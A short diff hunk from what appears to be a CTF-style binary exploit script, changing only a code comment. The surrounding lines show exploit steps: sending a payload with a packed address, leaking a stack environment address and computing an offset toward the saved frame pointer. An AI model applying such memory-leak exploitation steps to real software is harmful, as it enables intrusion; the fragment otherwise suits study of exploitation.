@@ -56,7 +56,7 @@ s.sendline(payload3)
 payload4 = "ya" + p32(0x0804b030) 
 s.sendline(payload4)
 s.recvuntil("29: ")
-# we care about the 29 element because it will print stack environment address
+# we care about the 29th element because it will print stack environment address
 stack_env = u32(s.recv()[:4])
 ebp_delete = stack_env - 0x104 
 
